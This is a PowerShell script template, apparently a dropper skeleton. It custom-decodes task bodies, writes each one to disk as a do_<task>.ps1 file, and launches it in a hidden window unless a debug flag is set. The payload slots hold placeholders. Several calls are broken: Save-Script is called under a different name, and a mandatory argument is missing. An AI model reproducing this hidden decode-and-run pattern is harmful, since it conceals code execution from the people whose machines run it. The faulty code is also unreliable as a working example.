###head
###head

. ./utils.ps1

function Script-Path {
    param
    (
    [Parameter(Mandatory = $true)]
    [string]
    $scriptPath,

    [Parameter(Mandatory = $true)]
    [string[]]
    $taskName
    )
    $directoryPath = Split-Path -Path $scriptPath -Parent
    $fullPath = Join-Path -Path $directoryPath -ChildPath "do_$taskName.ps1"
    return $fullPath
}

function Save-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string]
        $scriptPath,

        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName,

        [Parameter(Mandatory = $true)]
        [string[]]
        $body
    )
    $fullPath = Script-Path -scriptPath $scriptPath
    CustomDecode -inContent $body -outFile $fullPath
}

function Invoke-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string]
        $scriptPath,

        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName
    )
    $fullPath = Script-Path -scriptPath $scriptPath
    if ($globalDebug)
    {
        Start-Process powershell.exe -WindowStyle Normal -ArgumentList "-file ""$fullPath"" -Task $taskName"
    }
    else
    {
        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-file ""$fullPath"" -Task $taskName"
    }
}

$global:Task = $null

for ($i = 0; $i -lt $args.Count; $i++) {
    if ($args[$i] -eq '-Task') {
        if ($i + 1 -lt $args.Count) {
            $global:Task = $args[$i + 1]
        } else {
            writedbg "No value provided for -Task argument."
        }
    }
}

function Main 
{
    $scriptPath = Get-ScriptPath
    writedbg "program curScript: $scriptPath"

    if ($global:Task) {
        writedbg "Task - $task"
        & $global:Task
    } else {               

        $taskFunctions = @(
            ###doo
        )

        $tasks = @{
            "Key1" = "Value1"
            "Key2" = "Value2"
        }

        writedbg "Main - "
        foreach ($key in $tasks.Keys)
        {
            $task = $key
            $body = $tasks.$key
            writedbg "Main - $task"
            SaveScript -scriptPath $scriptPath -taskName $task -Body $body
            Invoke-Script -scriptPath $scriptPath -taskName $task
        }
    }
}

Main